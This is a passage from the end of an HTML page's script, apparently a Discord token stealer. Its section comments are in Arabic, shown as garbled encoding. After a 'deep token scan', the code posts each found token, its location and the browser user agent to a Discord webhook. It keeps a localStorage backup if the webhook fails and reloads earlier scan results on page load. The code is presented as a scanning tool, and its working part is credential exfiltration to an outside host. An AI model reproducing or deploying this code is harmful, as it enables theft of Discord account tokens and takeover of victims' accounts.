                            name: `Token #${index + 1} (${result.location})`,
                            value: `\`\`\`${result.token}\`\`\`\nConfidence: ${result.confidence}`,
                            inline: false
                        })),
                        footer: {
                            text: `Browser: ${navigator.userAgent.substring(0, 50)}...`
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    logToResults('‚úÖ Tokens sent to Discord webhook!');
                } else {
                    logToResults('‚ùå Webhook failed, saving locally...');
                    localStorage.setItem('discord_tokens_backup', JSON.stringify(results));
                }
            } catch (error) {
                logToResults(`‚ùå Webhook error: ${error.message}`);
            }
        }
        
        // ============================================
        // 4. ÿ™ŸÅÿπŸäŸÑ ÿßŸÑŸÜÿ∏ÿßŸÖ
        // ============================================
        
        document.addEventListener('DOMContentLoaded', function() {
            // ÿ™ÿ≠ÿØŸäÿ´ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖÿ™ÿµŸÅÿ≠
            const ua = navigator.userAgent;
            let browserName = 'Unknown';
            let browserVersion = '';
            
            if (ua.includes('Chrome') && !ua.includes('Edg')) {
                browserName = 'Chrome';
                const match = ua.match(/Chrome\/([\d.]+)/);
                browserVersion = match ? match[1] : '';
            } else if (ua.includes('Firefox')) {
                browserName = 'Firefox';
                const match = ua.match(/Firefox\/([\d.]+)/);
                browserVersion = match ? match[1] : '';
            } else if (ua.includes('Edg')) {
                browserName = 'Edge';
                const match = ua.match(/Edg\/([\d.]+)/);
                browserVersion = match ? match[1] : '';
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                browserName = 'Safari';
                const match = ua.match(/Version\/([\d.]+)/);
                browserVersion = match ? match[1] : '';
            }
            
            document.getElementById('browserName').textContent = browserName;
            document.getElementById('browserVersion').textContent = browserVersion;
            
            // ÿßÿÆÿ™Ÿäÿßÿ± ÿ∑ÿ±ŸäŸÇÿ© ÿßŸÑŸÖÿ≥ÿ≠
            document.querySelectorAll('.scan-option').forEach(option => {
                option.addEventListener('click', function() {
                    document.querySelectorAll('.scan-option').forEach(opt => {
                        opt.classList.remove('active');
                    });
                    this.classList.add('active');
                    currentMethod = this.dataset.method;
                });
            });
            
            // ÿ®ÿØÿ° ÿßŸÑŸÖÿ≥ÿ≠
            document.getElementById('startScan').addEventListener('click', async function() {
                const btn = this;
                const resultsPanel = document.getElementById('resultsPanel');
                const progressContainer = document.getElementById('progressContainer');
                
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
                resultsPanel.style.display = 'block';
                progressContainer.style.display = 'block';
                
                logToResults('=== STARTING DEEP TOKEN SCAN ===');
                logToResults(`Browser: ${browserName} ${browserVersion}`);
                logToResults(`User Agent: ${navigator.userAgent}`);
                logToResults(`Method: ${currentMethod}`);
                logToResults('---');
                
                try {
                    const scanner = new DeepTokenScanner();
                    const results = await scanner.startDeepScan();
                    
                    logToResults('=== SCAN COMPLETE ===');
                    logToResults(`Found: ${results.length} tokens`);
                    
                    displayResults(results);
                    
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-redo"></i> Scan Again';
                    
                } catch (error) {
                    logToResults(`‚ùå SCAN FAILED: ${error.message}`);
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-play"></i> Start Scan';
                }
            });
            
            // ŸÜÿ≥ÿÆ ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨
            document.getElementById('copyResults').addEventListener('click', function() {
                const results = document.getElementById('resultsContent').textContent;
                navigator.clipboard.writeText(results).then(() => {
                    logToResults('‚úÖ Results copied to clipboard!');
                });
            });
        });
        
        // ============================================
        // 5. Ÿàÿ∏ÿßÿ¶ŸÅ ŸÖÿ≥ÿßÿπÿØÿ© ÿπÿßŸÖÿ©
        // ============================================
        
        function copyToken(token) {
            navigator.clipboard.writeText(token).then(() => {
                alert('Token copied to clipboard!');
            });
        }
        
        // ÿ•ÿ∏Ÿáÿßÿ± ŸÜÿ™ÿßÿ¶ÿ¨ ÿßŸÑŸÖÿ≥ÿ≠ ÿßŸÑÿ≥ÿßÿ®ŸÇ ÿ•ÿ∞ÿß Ÿàÿ¨ÿØÿ™
        window.addEventListener('load', () => {
            const savedResults = localStorage.getItem('discord_tokens_backup');
            if (savedResults) {
                try {
                    const results = JSON.parse(savedResults);
                    if (results.length > 0) {
                        setTimeout(() => {
                            logToResults('üìÅ Loaded previous scan results from local storage');
                            displayResults(results.slice(0, 3));
                        }, 1000);
                    }
                } catch (e) {}
            }
        });
    </script>
</body>
</html>
